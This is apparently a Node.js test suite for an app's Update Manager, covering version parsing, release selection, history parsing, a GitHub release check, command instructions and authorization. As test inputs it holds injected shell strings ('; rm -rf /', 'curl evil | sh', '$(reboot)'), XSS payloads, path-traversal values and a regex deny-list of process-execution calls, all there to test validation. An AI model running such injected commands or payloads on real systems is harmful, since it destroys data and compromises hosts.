// Update Manager (server): version parsing and ordering, which releases are offered, the update history written by scripts/update.sh,
// the opt-in release check (no credentials, bounded, validated), version-specific instructions that name real scripts and options,
// authorization, and a source check that nothing here can run a command or change the installation.
import "./env.js";
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { openDb, migrate } from "../src/db.js";
import { buildApp } from "../src/app.js";
import { createBackup } from "../src/lib/backup.js";
import { addOwner, login, enrollDevice } from "./helpers.js";
import { tmpDir } from "./tmpdir.js";
import { parseVersion, compareVersions, channelOf, selectUpdates } from "../src/lib/version.js";
import { readHistory, normalizeRelease, fetchReleases, instructionsFor, installedReleases, defaultHistoryFile } from "../src/lib/updates.js";

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const REPO_PAGE = "https://github.com/NimeshPiyathissa/YT-WATCH-LEDGER/releases/";

/* ---- versions ---- */
test("version parsing is strict Semantic Versioning: real versions accepted, anything else refused", () => {
  assert.deepEqual(parseVersion("v0.8.0-beta.1"), { major: 0, minor: 8, patch: 0, pre: ["beta", 1], text: "0.8.0-beta.1" });
  assert.equal(parseVersion("1.2.3+build.5").text, "1.2.3", "build metadata is ignored");
  for (const bad of ["", "1.2", "1.2.3.4", "01.2.3", "1.2.3-", "1.2.3-beta..1", "1.2.3-01", "v 1.2.3", "1.2.3; rm -rf /", "1.2.3\n", "../1.2.3", "1.2.3-é", null, 5, "9".repeat(70)])
    assert.equal(parseVersion(bad), null, JSON.stringify(bad));
});

test("ordering follows SemVer precedence, and agrees with version_ge in scripts/lib/common.sh on the installer suite's cases", () => {
  const order = ["0.6.9", "0.7.0", "0.7.1", "0.8.0-alpha", "0.8.0-alpha.1", "0.8.0-beta", "0.8.0-beta.1", "0.8.0-beta.2", "0.8.0-beta.10", "0.8.0-rc.1", "0.8.0", "0.8.1", "0.9.0-beta.1", "0.10.0", "1.0.0-rc.1", "1.0.0"];
  const shuffled = [...order].reverse(); shuffled.sort(compareVersions);
  assert.deepEqual(shuffled, order);
  // the same pairs the installer suite checks for version_ge (A >= B)
  for (const [a, b, ge] of [["0.7.1", "0.7.0", true], ["0.8.0", "0.8.0-rc.1", true], ["0.8.0-beta.1", "0.8.0", false], ["0.8.0-rc.1", "0.8.0-beta.2", true], ["0.8.0-beta.1", "0.8.0-beta.2", false],
    ["0.8.0-beta.1", "0.8.0-beta.1", true], ["0.8.0-rc.1", "0.9.0-beta.1", false], ["v0.9.0-beta.1", "0.8.9", true], ["v0.10.0", "0.9.9", true], ["0.6.9", "0.7.0", false]])
    assert.equal(compareVersions(a, b) >= 0, ge, `${a} >= ${b}`);
  assert.equal(compareVersions("1.0.0-1", "1.0.0-alpha") < 0, true, "numeric identifiers rank below words");
  assert.throws(() => compareVersions("x", "1.0.0"));
});

test("release channels", () => {
  assert.deepEqual(["0.8.0", "0.8.0-rc.2", "0.8.0-beta.1", "1.0.0-alpha", "1.0.0-preview.3", "nope"].map(channelOf), ["stable", "rc", "beta", "alpha", "prerelease", "unknown"]);
});

test("what is offered: never a downgrade; stable installs get stable only; pre-releases only when switched on, same release line", () => {
  const rel = (version, prerelease = /-/.test(version)) => ({ version, prerelease });
  const list = [rel("0.7.0"), rel("0.8.0-beta.1"), rel("0.8.0-beta.2"), rel("0.8.0-rc.1"), rel("0.8.1"), rel("0.9.0-beta.1"), rel("1.0.0-rc.1")];
  const v = r => (r ? r.version : null);
  let s = selectUpdates("0.8.0", list, { includePrereleases: true });
  assert.deepEqual([v(s.latestStable), v(s.latestPrerelease), v(s.recommended)], ["0.8.1", null, "0.8.1"], "a stable install never sees a pre-release, even with the switch on");
  s = selectUpdates("0.8.0-beta.1", list);
  assert.deepEqual([v(s.latestStable), v(s.latestPrerelease), v(s.recommended)], ["0.8.1", null, "0.8.1"], "switch off: stable only");
  s = selectUpdates("0.8.0-beta.1", list, { includePrereleases: true });
  assert.deepEqual([v(s.latestStable), v(s.latestPrerelease), v(s.recommended)], ["0.8.1", "0.8.0-rc.1", "0.8.1"], "0.9.0-beta.1 is another release line and 1.0.0-rc.1 another major");
  s = selectUpdates("0.8.0-beta.2", [rel("0.7.0"), rel("0.8.0-beta.1"), rel("0.8.0-beta.2"), rel("0.8.0-beta.3")], { includePrereleases: true });
  assert.deepEqual([v(s.latestStable), v(s.recommended)], [null, "0.8.0-beta.3"], "older and equal versions are never offered");
  s = selectUpdates("0.9.9", list, { includePrereleases: true });
  assert.deepEqual([v(s.recommended)], [null], "nothing newer: nothing offered (never a downgrade)");
  s = selectUpdates("0.8.0-beta.1", [{ version: "0.9.0", prerelease: true }]);
  assert.equal(v(s.recommended), null, "a release GitHub marks as pre-release is not offered as stable");
  assert.equal(selectUpdates("garbage", list).recommended, null);
});

/* ---- history ---- */
const line = o => JSON.stringify({ v: 1, at: "2026-11-01T10:00:00Z", from: "0.7.0", to: "0.8.0", result: "success", stage: "verifying", source: "github", backup: "tracker-20261101T095900Z.db", previous: "0.7.0", exitCode: 0, ...o });
test("history: newest first, every field re-validated, bad lines skipped and counted, never fatal", () => {
  const d = tmpDir("yt-upd-"), f = path.join(d, "update-history.jsonl");
  assert.deepEqual(readHistory(f), { items: [], skipped: 0, available: false }, "no file yet");
  assert.equal(readHistory(d).available, false, "a folder is not a history file");
  fs.writeFileSync(f, [
    line({ at: "2026-10-01T10:00:00Z", to: "0.7.1", from: "0.7.0" }),
    line({ at: "2026-11-01T10:00:00Z", result: "rolled_back", stage: "migrating and switching", exitCode: 1 }),
    line({ at: "2026-11-02T10:00:00Z", result: "failed", stage: "verifying the target release", backup: "" }),
    "not json", "[]", line({ result: "pwned" }), line({ stage: "<img src=x onerror=alert(1)>" }), line({ at: "yesterday" }),
    line({ backup: "../../etc/passwd" }), line({ previous: "/opt/watch-ledger/releases/0.7.0" }), line({ exitCode: 999 }), ""
  ].join("\n"));
  const h = readHistory(f);
  assert.equal(h.available, true);
  assert.equal(h.skipped, 5, "bad JSON, an array, an unknown result, markup in a field, a bad date");
  assert.deepEqual(h.items.map(i => i.result), ["success", "success", "success", "failed", "rolled_back", "success"], "newest first");
  const failed = h.items.find(i => i.result === "failed");
  assert.equal(failed.changed, false, "stopped before the backup: nothing was changed");
  assert.equal(h.items.find(i => i.result === "rolled_back").changed, true);
  const tail = h.items.slice(0, 3);
  assert.deepEqual(tail.map(i => [i.backup, i.previous, i.exitCode]), [["tracker-20261101T095900Z.db", "0.7.0", null], ["tracker-20261101T095900Z.db", "", 0], ["", "0.7.0", 0]], "a path is never passed on");
  assert.ok(!JSON.stringify(h).includes("/"), "no path in anything returned");
});

test("history: a huge file is read from its end only, and the half line at the cut is dropped", () => {
  const d = tmpDir("yt-upd-"), f = path.join(d, "update-history.jsonl");
  const many = Array.from({ length: 3000 }, (_, i) => line({ at: new Date(Date.UTC(2026, 0, 1) + i * 60000).toISOString().replace(".000Z", "Z"), to: "0.8." + i }));
  fs.writeFileSync(f, many.join("\n") + "\n");
  const h = readHistory(f);
  assert.equal(h.items.length, 200, "at most 200 shown"); assert.equal(h.skipped, 0, "the cut line is not reported as damage");
  assert.equal(h.items[0].to, "0.8.2999", "the newest is first");
});

test("the history file is found next to the data folder of the installer layout, or where UPDATE_HISTORY_FILE says", () => {
  assert.equal(defaultHistoryFile("/var/lib/watch-ledger/data/tracker.db", {}).replace(/\\/g, "/").replace(/^[A-Z]:/, ""), "/var/lib/watch-ledger/update-history.jsonl");
  assert.equal(defaultHistoryFile(":memory:", {}), null);
  assert.equal(defaultHistoryFile("/x/data/t.db", { UPDATE_HISTORY_FILE: "/custom/h.jsonl" }), "/custom/h.jsonl");
});

/* ---- releases from GitHub ---- */
test("a published release is only taken when its tag is a version; links must point at this repository; drafts and markup are dropped", () => {
  const ok = normalizeRelease({ tag_name: "v0.8.1", name: "Watch\u0000 Ledger <b>0.8.1</b>", draft: false, prerelease: false, html_url: REPO_PAGE + "tag/v0.8.1", published_at: "2026-11-05T00:00:00Z", body: "<script>x()</script>" });
  assert.deepEqual(ok, { version: "0.8.1", tag: "v0.8.1", prerelease: false, name: "Watch  Ledger <b>0.8.1</b>", url: REPO_PAGE + "tag/v0.8.1", publishedAt: Date.parse("2026-11-05T00:00:00Z") });
  assert.ok(!("body" in ok), "release notes are not taken");
  assert.equal(normalizeRelease({ tag_name: "v0.8.2", draft: false, html_url: "javascript:alert(1)" }).url, REPO_PAGE + "tag/v0.8.2", "a foreign link is replaced by this repository's");
  assert.equal(normalizeRelease({ tag_name: "v0.8.2", draft: false, html_url: REPO_PAGE + "tag/v0.8.2\"><script>" }).url, REPO_PAGE + "tag/v0.8.2");
  for (const bad of [{ tag_name: "v0.8.1", draft: true }, { tag_name: "latest", draft: false }, { tag_name: "release-0.8.1", draft: false }, { tag_name: "v0.8.1; rm -rf /", draft: false }, { tag_name: "v0.8.1" }, null, "x"])
    assert.equal(normalizeRelease(bad), null, JSON.stringify(bad));
});

function fakeFetch(handler) {
  const calls = [];
  const fn = async (url, opts) => { calls.push({ url, opts }); return handler(url, opts); };
  fn.calls = calls;
  return fn;
}
const jsonResponse = (body, { status = 200, type = "application/json; charset=utf-8" } = {}) => new Response(typeof body === "string" ? body : JSON.stringify(body), { status, headers: { "content-type": type } });

test("the release check sends no credentials (even with a GITHUB_TOKEN in the environment), follows no redirect, and is bounded", async () => {
  const saved = process.env.GITHUB_TOKEN; process.env.GITHUB_TOKEN = "ghp_secret_should_never_leave";
  try {
    const f = fakeFetch(() => jsonResponse([{ tag_name: "v0.8.1", draft: false, prerelease: false, html_url: REPO_PAGE + "tag/v0.8.1" }]));
    const r = await fetchReleases({ fetchImpl: f });
    assert.equal(r.ok, true); assert.deepEqual(r.releases.map(x => x.version), ["0.8.1"]);
    const { url, opts } = f.calls[0];
    assert.equal(url, "https://api.github.com/repos/NimeshPiyathissa/YT-WATCH-LEDGER/releases?per_page=30");
    assert.equal(opts.redirect, "error"); assert.equal(opts.credentials, "omit"); assert.equal(opts.method, "GET");
    const headers = Object.fromEntries(Object.entries(opts.headers).map(([k, v]) => [k.toLowerCase(), v]));
    assert.ok(!("authorization" in headers) && !("cookie" in headers), "no credential header");
    assert.ok(!JSON.stringify(f.calls).includes("ghp_secret"), "the token never appears in the request");
  } finally { if (saved === undefined) delete process.env.GITHUB_TOKEN; else process.env.GITHUB_TOKEN = saved; }
});

test("the release check: errors are named, oversized or malformed answers are refused, a hang times out", async () => {
  const run = handler => fetchReleases({ fetchImpl: fakeFetch(handler), timeoutMs: 200 });
  assert.equal((await run(() => jsonResponse({ message: "API rate limit exceeded" }, { status: 403 }))).error, "rate_limited");
  assert.equal((await run(() => jsonResponse({}, { status: 404 }))).error, "no_releases");
  assert.equal((await run(() => jsonResponse({}, { status: 500 }))).error, "bad_status");
  assert.equal((await run(() => jsonResponse("<html>", { type: "text/html" }))).error, "bad_response");
  assert.equal((await run(() => jsonResponse({ not: "a list" }))).error, "bad_response");
  assert.equal((await run(() => jsonResponse("{oops"))).error, "bad_response");
  assert.equal((await run(() => jsonResponse("[" + "\"x\",".repeat(400000) + "\"x\"]"))).error, "too_large");
  assert.equal((await run(() => { throw new TypeError("fetch failed"); })).error, "unreachable");
  assert.equal((await run((url, opts) => new Promise((_, rej) => opts.signal.addEventListener("abort", () => rej(Object.assign(new Error("aborted"), { name: "AbortError" })))))).error, "timeout");
});

/* ---- instructions ---- */
function scriptOptions(file) {
  const src = fs.readFileSync(path.join(ROOT, "scripts", file), "utf8");
  return new Set([...src.matchAll(/^\s+(--[a-z-]+)(?:\|[-a-z]+)?\)/gm)].map(m => m[1]));
}
test("instructions are version-specific and only name scripts and options that exist", () => {
  const i = instructionsFor({ installed: "0.8.0-beta.1", target: "0.8.1", previous: "0.8.0-beta.1", backup: "tracker-20261109T020000Z.db" });
  const all = [...i.update, ...i.rollbackCode, ...i.rollbackData].map(s => s.cmd);
  assert.ok(all.includes("sudo ./scripts/update.sh --version v0.8.1"));
  assert.ok(all.includes("sudo ln -sfn /opt/watch-ledger/releases/0.8.0-beta.1 /opt/watch-ledger/current"));
  assert.ok(all.some(c => c.endsWith("sudo ./scripts/restore.sh /var/lib/watch-ledger/backups/pre-update/tracker-20261109T020000Z.db")));
  const opts = { "update.sh": scriptOptions("update.sh"), "restore.sh": scriptOptions("restore.sh"), "health-check.sh": scriptOptions("health-check.sh") };
  for (const c of all) for (const m of c.matchAll(/\.\/scripts\/([\w-]+\.sh)((?: --?[\w-]+(?: [^\s-][^\s]*)?)*)/g)) {
    assert.ok(fs.existsSync(path.join(ROOT, "scripts", m[1])), m[1] + " exists");
    for (const o of m[2].match(/--[\w-]+/g) || []) assert.ok(opts[m[1]].has(o), `${m[1]} accepts ${o}`);
  }
  const svc = fs.readFileSync(path.join(ROOT, "scripts/lib/common.sh"), "utf8");
  assert.match(svc, /WL_SERVICE="watch-ledger"/, "the service name in the restart command is the installer's");
  assert.match(svc, /WL_PREFIX_DIR:-\/opt\/watch-ledger/); assert.match(svc, /WL_VAR_DIR:-\/var\/lib\/watch-ledger/);
});

test("instructions never carry an unvalidated value into a command", () => {
  const i = instructionsFor({ installed: "0.8.0", target: "1.0.0; curl evil | sh", previous: "$(reboot)", backup: "x.db; rm -rf /" });
  const text = JSON.stringify(i);
  assert.ok(!/curl|reboot|rm -rf|\$\(/.test(text));
  assert.ok(text.includes("--version vX.Y.Z") && text.includes("<previous version>") && text.includes("<pre-update backup>"));
});

/* ---- installed releases ---- */
function fakeInstall() {
  const base = tmpDir("yt-upd-inst-"), rel = path.join(base, "opt", "releases");
  const mk = (v, complete = true) => { const d = path.join(rel, v, "server"); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, "package.json"), JSON.stringify({ version: v })); fs.writeFileSync(path.join(rel, v, "manifest.json"), JSON.stringify({ version: v.split("-")[0], version_name: v })); if (complete) fs.writeFileSync(path.join(rel, v, ".install-complete"), v); };
  mk("0.8.0-beta.1"); mk("0.7.0"); mk("0.6.0", false); fs.mkdirSync(path.join(rel, "not-a-version"), { recursive: true });
  return { serverRoot: path.join(rel, "0.8.0-beta.1", "server"), rel };
}
test("installed releases are read from the installer's releases folder; unfinished or odd folders are not listed", () => {
  const { serverRoot } = fakeInstall();
  const r = installedReleases(path.dirname(serverRoot), "0.8.0-beta.1");
  assert.deepEqual(r, { layout: "installer", items: [{ version: "0.8.0-beta.1", current: true }, { version: "0.7.0", current: false }] });
  assert.deepEqual(installedReleases(ROOT, "0.8.0-beta.1"), { layout: "checkout", items: [] });
});

/* ---- the routes ---- */
async function setup({ fetchImpl = null, history = null } = {}) {
  const db = openDb(); migrate(db);
  const base = tmpDir("yt-upd-app-"), backupDir = path.join(base, "backups"), pre = path.join(backupDir, "pre-update");
  fs.mkdirSync(pre, { recursive: true });
  const historyFile = path.join(base, "update-history.jsonl");
  if (history) fs.writeFileSync(historyFile, history.join("\n") + "\n");
  const { serverRoot } = fakeInstall();
  const fetch = fetchImpl || fakeFetch(() => jsonResponse([
    { tag_name: "v0.8.0", draft: false, prerelease: false, html_url: REPO_PAGE + "tag/v0.8.0", name: "0.8.0 <script>alert(1)</script>", published_at: "2026-11-20T00:00:00Z" },
    { tag_name: "v0.8.0-rc.1", draft: false, prerelease: true, html_url: REPO_PAGE + "tag/v0.8.0-rc.1" },
    { tag_name: "v0.7.0", draft: false, prerelease: false, html_url: REPO_PAGE + "tag/v0.7.0" }]));
  const app = await buildApp({ db, config: { backupDir, backupKeep: 3, updateHistoryFile: historyFile, serverRoot, fetch } });
  await app.ready();
  await addOwner(db);
  const cookie = await login(app);
  const api = async (method, url, payload, headers = {}) => { const r = await app.inject({ method, url, payload, headers: { cookie, ...headers } }); return { code: r.statusCode, body: r.json(), raw: r.body }; };
  const setFlags = changes => api("PUT", "/api/settings/studio", { changes });
  return { app, db, api, setFlags, fetch, pre, base, cookie };
}

test("GET /api/updates: version, channel, Node.js, uptime, history, pre-update backups, installed releases and instructions; no path or secret", async () => {
  const s = await setup({ history: [line({ at: "2026-11-01T10:00:00Z", from: "0.7.0", to: "0.8.0-beta.1", result: "success", previous: "0.7.0" }), line({ at: "2026-11-02T10:00:00Z", from: "0.8.0-beta.1", to: "0.8.0-beta.2", result: "rolled_back", stage: "migrating and switching" })] });
  await createBackup(s.db, s.pre, 1000);
  const { code, body: d, raw } = await s.api("GET", "/api/updates");
  assert.equal(code, 200);
  assert.deepEqual([d.installed.version, d.installed.channel, d.installed.channelLabel, d.installed.layout, d.installed.consistent], ["0.8.0-beta.1", "beta", "Beta", "installer", true]);
  assert.equal(d.installed.node, process.version); assert.ok(d.installed.uptimeSec >= 0 && d.installed.startedAt <= Date.now());
  assert.equal(d.installed.installedAt, Date.parse("2026-11-01T10:00:00Z"), "from the history's successful update to this version");
  assert.deepEqual(d.history.items.map(h => h.result), ["rolled_back", "success"]);
  assert.equal(d.backups.items.length, 1); assert.match(d.backups.items[0].name, /^tracker-.*\.db$/);
  assert.deepEqual(d.releases.map(r => r.version), ["0.8.0-beta.1", "0.7.0"]);
  assert.equal(d.instructions.previous, "0.7.0"); assert.equal(d.instructions.backup, d.backups.items[0].name);
  assert.deepEqual([d.check.enabled, d.check.includePrereleases, d.check.last], [false, false, null], "the check is off by default");
  assert.ok(!raw.includes(s.base) && !raw.includes(s.base.replace(/\\/g, "\\\\")), "no server path appears");
  assert.ok(!/MASTER_KEY|COOKIE_SECRET|GITHUB_TOKEN|ghp_|pw_hash/i.test(raw), "no secret appears");
});

test("the check is off by default: it answers 409 and GitHub is never contacted", async () => {
  const s = await setup();
  const r = await s.api("POST", "/api/updates/check");
  assert.equal(r.code, 409); assert.equal(r.body.error, "check_disabled");
  assert.equal(s.fetch.calls.length, 0);
});

test("with the check on: a beta is offered stable releases only, until pre-releases are switched on; results are cached and audited", async () => {
  const s = await setup();
  assert.equal((await s.setFlags({ update_check_enabled: true })).code, 200);
  let r = await s.api("POST", "/api/updates/check");
  assert.equal(r.code, 200); assert.equal(r.body.ok, true); assert.equal(r.body.cached, false);
  assert.equal(r.body.recommended.version, "0.8.0", "0.8.0 is newer than 0.8.0-beta.1; 0.7.0 would be a downgrade");
  assert.equal(r.body.latestPrerelease, null, "pre-releases are off");
  assert.equal(r.body.recommended.name, "0.8.0 <script>alert(1)</script>", "kept as text; the page escapes it");
  assert.equal(s.fetch.calls.length, 1);
  r = await s.api("POST", "/api/updates/check");
  assert.equal(r.body.cached, true); assert.equal(s.fetch.calls.length, 1, "a second check within 10 minutes is answered from the last one");
  await s.setFlags({ update_include_prereleases: true });
  r = await s.api("POST", "/api/updates/check");
  assert.equal(r.body.cached, false, "changing the setting asks again");
  assert.equal(r.body.latestPrerelease.version, "0.8.0-rc.1"); assert.equal(r.body.recommended.version, "0.8.0");
  const g = (await s.api("GET", "/api/updates")).body;
  assert.equal(g.check.last.recommended.version, "0.8.0"); assert.equal(g.check.last.stale, false);
  assert.ok(g.instructions.update.some(x => x.cmd === "sudo ./scripts/update.sh --version v0.8.0"), "the commands are filled in for the release found");
  const log = s.db.prepare("SELECT detail FROM audit_log WHERE action='update_check'").all().map(x => JSON.parse(x.detail));
  assert.equal(log.length, 2); assert.equal(log[0].recommended, "0.8.0");
});

test("a failed check is reported, stored and audited, and changes nothing else", async () => {
  const s = await setup({ fetchImpl: fakeFetch(() => jsonResponse({ message: "rate limited" }, { status: 403 })) });
  await s.setFlags({ update_check_enabled: true });
  const r = await s.api("POST", "/api/updates/check");
  assert.equal(r.code, 200); assert.equal(r.body.ok, false); assert.equal(r.body.error, "rate_limited"); assert.equal(r.body.recommended, null);
  assert.equal((await s.api("POST", "/api/updates/check")).body.cached, false, "a failure is not cached");
  assert.equal((await s.api("GET", "/api/updates")).body.instructions.target, null);
});

test("verifying a pre-update backup: checked by name in the pre-update folder only, audited", async () => {
  const s = await setup();
  const b = await createBackup(s.db, s.pre, 1000);
  const ok = await s.api("POST", `/api/updates/backups/${b.name}/verify`);
  assert.equal(ok.code, 200); assert.equal(ok.body.restorable, true); assert.equal(ok.body.integrity, true);
  assert.equal((await s.api("POST", "/api/updates/backups/tracker-20990101T000000Z.db/verify")).code, 404);
  for (const bad of ["..%2F..%2Fsecret.db", "tracker.db", "x"]) assert.equal((await s.api("POST", `/api/updates/backups/${bad}/verify`)).code, 400, bad);
  const log = s.db.prepare("SELECT detail FROM audit_log WHERE action='backup_verified'").all().map(x => JSON.parse(x.detail));
  assert.equal(log.length, 1); assert.equal(log[0].folder, "pre-update");
});

test("authorization: every Update Manager route is owner-only; a device token and a cross-site request are refused", async () => {
  const s = await setup();
  const dev = await enrollDevice(s.app, s.cookie, "Laptop");
  for (const [m, u] of [["GET", "/api/updates"], ["POST", "/api/updates/check"], ["POST", "/api/updates/backups/tracker-20261109T020000Z.db/verify"]]) {
    assert.equal((await s.app.inject({ method: m, url: u })).statusCode, 401, m + " " + u);
    assert.equal((await s.app.inject({ method: m, url: u, headers: dev.auth })).statusCode, 401, m + " " + u + " with a device token");
  }
  await s.setFlags({ update_check_enabled: true });
  const x = await s.api("POST", "/api/updates/check", undefined, { origin: "https://evil.example" });
  assert.equal(x.code, 403); assert.equal(s.fetch.calls.length, 0);
  const off = await s.api("PUT", "/api/settings/studio", { changes: { update_check_enabled: false } }, { origin: "https://evil.example" });
  assert.equal(off.code, 403, "the switch cannot be flipped from another site either");
});

test("the update-check settings are part of Settings Studio, off by default, booleans only", async () => {
  const s = await setup();
  const g = (await s.api("GET", "/api/settings/studio")).body;
  const grp = g.groups.find(x => x.key === "updates");
  assert.deepEqual(grp.items.map(i => [i.key, i.value, i.source]), [["update_check_enabled", false, "default"], ["update_include_prereleases", false, "default"]]);
  assert.equal((await s.setFlags({ update_check_enabled: "yes" })).code, 400);
});

/* ---- nothing here can run a command or change the installation ---- */
test("security: the Update Manager code cannot start a process, write files or read credentials", () => {
  for (const f of ["src/routes/updates.js", "src/lib/updates.js", "src/lib/version.js", "web/updates.js"]) {
    const src = fs.readFileSync(path.join(ROOT, "server", f), "utf8").replace(/\/\/.*$/gm, "").replace(/\/\*[\s\S]*?\*\//g, "");
    assert.ok(!/child_process|(?<![.\w])(exec|execSync|execFile|execFileSync|spawn|spawnSync|fork)\(|new Function|(?<![.\w])eval\(/.test(src), f + ": no process or code execution"); // RegExp#exec is fine
    assert.ok(!/\b(writeFile|appendFile|rm|rmSync|rmdir|unlink|rename|symlink|link|mkdir|copyFile|cp|chmod|chown|truncate)(Sync)?\(/.test(src), f + ": no file changes");
    assert.ok(!/GITHUB_TOKEN|GH_TOKEN|[Aa]uthorization|MASTER_KEY|COOKIE_SECRET/.test(src), f + ": no credentials");
  }
  const routes = fs.readFileSync(path.join(ROOT, "server/src/routes/updates.js"), "utf8");
  assert.deepEqual([...routes.matchAll(/app\.(get|post|put|patch|delete)\(\s*"([^"]+)"/g)].map(m => m[1] + " " + m[2]), ["get /api/updates", "post /api/updates/check", "post /api/updates/backups/:name/verify"], "no route that could install or roll back");
});
